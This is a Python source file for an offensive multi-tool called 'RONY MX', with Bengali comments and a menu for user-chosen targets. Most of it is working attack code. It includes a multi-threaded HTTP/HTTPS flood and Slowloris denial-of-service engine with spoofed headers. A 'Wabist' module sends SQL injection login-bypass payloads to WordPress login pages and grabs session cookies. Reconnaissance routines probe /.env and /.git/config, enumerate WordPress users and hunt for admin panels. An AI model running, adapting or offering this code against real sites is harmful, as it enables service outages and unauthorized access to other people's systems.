
import os
import sys
import time
import json
import socket
import hashlib
import random
import threading
import requests
import urllib3
import base64
import hmac
import re
from urllib.parse import urlparse, urljoin
import dns.resolver
import whois

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== রঙের কোড =====
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
W = '\033[97m'
RESET = '\033[0m'

# ===== ব্যানার =====
def banner():
    os.system('clear')
    print(f"""
{R}╔══════════════════════════════════════════════════════════════╗
{R}║                                                              ║
{R}║  {C}██████╗  ██████╗ ███╗   ██╗██╗   ██╗    ███╗   ███╗██╗  {R}║
{R}║  {C}██╔══██╗██╔═══██╗████╗  ██║╚██╗ ██╔╝    ████╗ ████║╚██╗ {R}║
{R}║  {C}██████╔╝██║   ██║██╔██╗ ██║ ╚████╔╝     ██╔████╔██║ ╚██╗{R}║
{R}║  {C}██╔══██╗██║   ██║██║╚██╗██║  ╚██╔╝      ██║╚██╔╝██║ ██╔╝{R}║
{R}║  {C}██║  ██║╚██████╔╝██║ ╚████║   ██║       ██║ ╚═╝ ██║██╔╝ {R}║
{R}║  {C}╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚═╝╚═╝  {R}║
{R}║                                                              ║
{R}║           {W}RONY MX - MULTI TOOL KIT v3.0{R}                   ║
{R}║           {Y}Author: Rony | Status: Online{R}                    ║
{R}╚══════════════════════════════════════════════════════════════╝
{RESET}""")

# ===== Wabist Engine (SQLi) =====
class Wabist:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})

    def sqli_bypass(self):
        payloads = [
            "admin' OR '1'='1'--",
            "admin'--",
            "admin' #",
            "admin' OR '1'='1'/*",
            "1' OR '1'='1'--",
            "admin' UNION SELECT 1--"
        ]
        for p in payloads:
            try:
                data = {"log": p, "pwd": "anything", "wp-submit": "Log In"}
                resp = self.session.post(self.target + '/wp-login.php', data=data, allow_redirects=False, timeout=10)
                if resp.status_code == 302 and 'wp-admin' in resp.headers.get('Location', ''):
                    return {'method': 'sqli', 'payload': p, 'redirect': resp.headers['Location'], 'cookies': self.session.cookies.get_dict()}
                elif resp.status_code == 200 and ('dashboard' in resp.text.lower() or 'wp-admin' in resp.text.lower()):
                    return {'method': 'sqli_direct', 'payload': p, 'cookies': self.session.cookies.get_dict()}
            except:
                pass
        return None

    def run(self):
        print(f"{B}[*] Wabist: Scanning {self.target}{RESET}")
        result = self.sqli_bypass()
        if result:
            print(f"{G}[+] SUCCESS!{RESET}")
            print(json.dumps(result, indent=2))
        else:
            print(f"{R}[-] SQLi failed.{RESET}")
        return result

# ===== DDoS ইঞ্জিন (সঠিক) =====
class DDoSEngine:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.stop_flag = False
        self.sent = 0
        self.lock = threading.Lock()

    def flood_http(self, thread_id):
        while not self.stop_flag:
            try:
                # র্যান্ডম পাথ
                paths = ['/', '/index.php', '/wp-login.php', '/admin', '/api', '/test']
                path = random.choice(paths)
                url = self.target + path
                # র্যান্ডম প্যারামিটার
                params = {f'x{random.randint(1,9999)}': random.randint(1,999999)}
                # হেডার
                headers = {
                    'User-Agent': random.choice([
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                        'Googlebot/2.1 (+http://www.google.com/bot.html)',
                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'
                    ]),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0',
                    'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                }
                # GET রিকোয়েস্ট
                self.session.get(url, params=params, headers=headers, timeout=2)
                # POST রিকোয়েস্ট
                data = {f'field{random.randint(1,100)}': os.urandom(random.randint(100,500)).hex()}
                self.session.post(url, data=data, headers=headers, timeout=2)
                with self.lock:
                    self.sent += 2
            except:
                pass

    def flood_https(self, thread_id):
        # HTTPS এর জন্য আলাদা সেশন (SNI সহ)
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        while not self.stop_flag:
            try:
                paths = ['/', '/wp-json/', '/api/v1/', '/robots.txt']
                path = random.choice(paths)
                url = self.target + path
                s.get(url, timeout=2)
                s.post(url, data={'spam': os.urandom(200).hex()}, timeout=2)
                with self.lock:
                    self.sent += 2
            except:
                pass

    def slowloris(self, thread_id):
        # Slowloris স্টাইল – সংযোগ খোলা রাখা
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            host = urlparse(self.target).netloc
            sock.connect((host, 443 if self.target.startswith('https') else 80))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(f"Host: {host}\r\n".encode())
            while not self.stop_flag:
                sock.send(b"X-Header: random\r\n")
                time.sleep(5)
        except:
            pass

    def start_attack(self, threads=100, duration=60, method='mixed'):
        print(f"{R}[!] DDoS Attack started on {self.target}{RESET}")
        print(f"{R}[!] Threads: {threads} | Duration: {duration}s | Method: {method}{RESET}")
        self.stop_flag = False
        self.sent = 0
        start_time = time.time()

        if method == 'http':
            for i in range(threads):
                t = threading.Thread(target=self.flood_http, args=(i,))
                t.daemon = True
                t.start()
        elif method == 'https':
            for i in range(threads):
                t = threading.Thread(target=self.flood_https, args=(i,))
                t.daemon = True
                t.start()
        elif method == 'slowloris':
            for i in range(threads // 2):
                t = threading.Thread(target=self.slowloris, args=(i,))
                t.daemon = True
                t.start()
        else:  # mixed
            for i in range(threads // 3):
                t = threading.Thread(target=self.flood_http, args=(i,))
                t.daemon = True
                t.start()
            for i in range(threads // 3):
                t = threading.Thread(target=self.flood_https, args=(i,))
                t.daemon = True
                t.start()
            for i in range(threads // 3):
                t = threading.Thread(target=self.slowloris, args=(i,))
                t.daemon = True
                t.start()

        time.sleep(duration)
        self.stop_flag = True
        time.sleep(1)
        elapsed = time.time() - start_time
        print(f"{G}[+] Attack finished. Total requests: {self.sent} in {elapsed:.1f}s{RESET}")
        print(f"{G}[+] Rate: {self.sent/elapsed:.1f} req/s{RESET}")

# ===== RonyMX টুলস =====
class RonyMX:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})

    def check_ip(self):
        try:
            r = requests.get('https://api.ipify.org?format=json', timeout=5)
            data = r.json()
            print(f"{G}[+] Public IP: {data['ip']}{RESET}")
            r2 = requests.get(f'http://ip-api.com/json/{data["ip"]}', timeout=5)
            geo = r2.json()
            print(f"{G}[+] Country: {geo.get('country')} | City: {geo.get('city')} | ISP: {geo.get('isp')}{RESET}")
        except Exception as e:
            print(f"{R}[-] Error: {e}{RESET}")

    def website_info(self, url):
        if not url.startswith('http'):
            url = 'https://' + url
        parsed = urlparse(url)
        domain = parsed.netloc
        print(f"{B}[*] Scanning: {url}{RESET}")
        info = {}

        try:
            ips = socket.gethostbyname_ex(domain)[2]
            info['dns_a'] = ips
            print(f"{G}[+] DNS A: {ips}{RESET}")
        except:
            info['dns_a'] = []

        try:
            r = self.session.get(url, timeout=10)
            info['status'] = r.status_code
            info['server'] = r.headers.get('Server', '')
            info['headers'] = dict(r.headers)
            print(f"{G}[+] Status: {r.status_code} | Server: {info['server']}{RESET}")
        except Exception as e:
            print(f"{R}[-] Headers error: {e}{RESET}")

        try:
            w = whois.whois(domain)
            info['whois'] = {'registrar': w.registrar, 'creation': str(w.creation_date)}
            print(f"{G}[+] Registrar: {w.registrar}{RESET}")
        except:
            info['whois'] = {}

        try:
            r = self.session.get(urljoin(url, '/robots.txt'), timeout=5)
            if r.status_code == 200:
                info['robots'] = r.text[:200]
                print(f"{G}[+] robots.txt found{RESET}")
        except:
            pass

        try:
            r = self.session.get(url, timeout=10)
            if 'wp-content' in r.text:
                info['cms'] = 'WordPress'
                print(f"{G}[+] CMS: WordPress{RESET}")
                try:
                    u = self.session.get(urljoin(url, '/wp-json/wp/v2/users'), timeout=5)
                    if u.status_code == 200:
                        users = u.json()
                        info['wp_users'] = [{'id': x['id'], 'name': x.get('name', '')} for x in users]
                        print(f"{G}[+] WP Users: {[x['name'] for x in users]}{RESET}")
                except:
                    pass
        except:
            pass

        dirs = ['/admin', '/login', '/wp-admin', '/phpmyadmin', '/.env', '/.git/config']
        found = []
        for d in dirs:
            try:
                r = self.session.get(urljoin(url, d), timeout=3, allow_redirects=False)
                if r.status_code in [200, 301, 302, 403]:
                    found.append({'path': d, 'status': r.status_code})
                    print(f"{G}[+] Found: {d} ({r.status_code}){RESET}")
            except:
                pass
        info['common_dirs'] = found

        print(f"{Y}\n[+] Full Info (JSON):{RESET}")
        print(json.dumps(info, indent=2, default=str))
        return info

    def admin_finder(self, url):
        if not url.startswith('http'):
            url = 'https://' + url
        print(f"{B}[*] Looking for admin panel...{RESET}")
        admin_paths = [
            '/admin', '/administrator', '/login', '/wp-admin', '/admin/login',
            '/cpanel', '/webmail', '/phpmyadmin', '/adminpanel', '/dashboard',
            '/manage', '/backend', '/staff', '/moderator', '/controlpanel'
        ]
        found = []
        for path in admin_paths:
            try:
                r = self.session.get(urljoin(url, path), timeout=3, allow_redirects=False)
                if r.status_code in [200, 301, 302, 403]:
                    found.append({'path': path, 'status': r.status_code, 'redirect': r.headers.get('Location', '')})
                    print(f"{G}[+] {path} -> {r.status_code}{RESET}")
                else:
                    print(f"{W}[-] {path} -> {r.status_code}{RESET}")
            except:
                pass
        if found:
            print(f"{G}[+] Admin panel(s) found: {len(found)}{RESET}")
        else:
            print(f"{R}[-] No admin panel found.{RESET}")
        return found

    def ddos_attack(self):
        url = input(f"{Y}Enter target URL (e.g. https://example.com): {RESET}").strip()
        if not url.startswith('http'):
            url = 'https://' + url
        threads = int(input(f"{Y}Threads (default 100): {RESET}") or 100)
        duration = int(input(f"{Y}Duration in seconds (default 60): {RESET}") or 60)
        print(f"{Y}Attack methods: http, https, slowloris, mixed{RESET}")
        method = input(f"{Y}Method (default mixed): {RESET}").strip().lower() or 'mixed'
        engine = DDoSEngine(url)
        engine.start_attack(threads, duration, method)

    def password_generator(self, length=16):
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'
        pwd = ''.join(random.choice(chars) for _ in range(length))
        print(f"{G}[+] Generated Password: {pwd}{RESET}")
        return pwd

    def hash_generator(self, text):
        print(f"{B}[*] Hashing: {text}{RESET}")
        for algo in ['md5', 'sha1', 'sha256', 'sha512']:
            h = hashlib.new(algo, text.encode()).hexdigest()
            print(f"{G}[+] {algo.upper()}: {h}{RESET}")

    def port_scanner(self, host, ports='21,22,23,25,53,80,110,143,443,445,3306,3389,5432,8080'):
        print(f"{B}[*] Scanning {host} for ports: {ports}{RESET}")
        ports = [int(p.strip()) for p in ports.split(',')]
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"{G}[+] Port {port} OPEN{RESET}")
                sock.close()
            except:
                pass
        if not open_ports:
            print(f"{R}[-] No open ports found.{RESET}")
        return open_ports

    def dns_lookup(self, domain):
        print(f"{B}[*] DNS Lookup for {domain}{RESET}")
        try:
            ips = socket.gethostbyname_ex(domain)[2]
            print(f"{G}[+] A Records: {ips}{RESET}")
        except:
            print(f"{R}[-] A Records not found{RESET}")
        for q in ['MX', 'NS', 'TXT']:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = ['8.8.8.8']
                ans = resolver.resolve(domain, q)
                print(f"{G}[+] {q}: {[str(r) for r in ans]}{RESET}")
            except:
                pass

    def wabist_tool(self):
        url = input(f"{Y}Enter target URL (e.g. https://example.com): {RESET}").strip()
        w = Wabist(url)
        w.run()

# ===== মেনু =====
def menu():
    tool = RonyMX()
    while True:
        banner()
        print(f"""
{C}╔═══════════════════════════════════════════════════════════════╗
{C}║                    SELECT AN OPTION                            ║
{C}╠═══════════════════════════════════════════════════════════════╣
{C}║  {W}1. Check System & Public IP{RESET}                              {C}║
{C}║  {W}2. Website Info (DNS, Headers, CMS, Users){RESET}              {C}║
{C}║  {W}3. Admin Panel Finder{RESET}                                  {C}║
{C}║  {W}4. DDoS Attack (HTTP/HTTPS/Slowloris){RESET}                   {C}║
{C}║  {W}5. Secure Password Generator{RESET}                           {C}║
{C}║  {W}6. IP Geolocation Lookup{RESET}                               {C}║
{C}║  {W}7. DNS Records Lookup{RESET}                                  {C}║
{C}║  {W}8. Hash Generator (MD5, SHA1, SHA256, SHA512){RESET}         {C}║
{C}║  {W}9. Port Scanner{RESET}                                       {C}║
{C}║  {W}10. Wabist - SQLi Auto Exploit{RESET}                         {C}║
{C}║  {W}11. Exit Tool{RESET}                                          {C}║
{C}╚═══════════════════════════════════════════════════════════════╝
{RESET}""")
        choice = input(f"{Y}Select option >> {RESET}").strip()
        
        if choice == '1':
            tool.check_ip()
        elif choice == '2':
            url = input(f"{Y}Enter website URL: {RESET}").strip()
            tool.website_info(url)
        elif choice == '3':
            url = input(f"{Y}Enter website URL: {RESET}").strip()
            tool.admin_finder(url)
        elif choice == '4':
            tool.ddos_attack()
        elif choice == '5':
            length = int(input(f"{Y}Password length (default 16): {RESET}") or 16)
            tool.password_generator(length)
        elif choice == '6':
            tool.check_ip()
        elif choice == '7':
            domain = input(f"{Y}Enter domain: {RESET}").strip()
            tool.dns_lookup(domain)
        elif choice == '8':
            text = input(f"{Y}Enter text to hash: {RESET}").strip()
            tool.hash_generator(text)
        elif choice == '9':
            host = input(f"{Y}Enter host/IP: {RESET}").strip()
            ports = input(f"{Y}Ports (comma separated, default 21,22,23,25,53,80,443): {RESET}").strip()
            if not ports:
                ports = '21,22,23,25,53,80,443'
            tool.port_scanner(host, ports)
        elif choice == '10':
            tool.wabist_tool()
        elif choice == '11':
            print(f"{R}Exiting...{RESET}")
            sys.exit()
        else:
            print(f"{R}Invalid option!{RESET}")
        input(f"{Y}\nPress Enter to continue...{RESET}")

if __name__ == "__main__":
    menu()
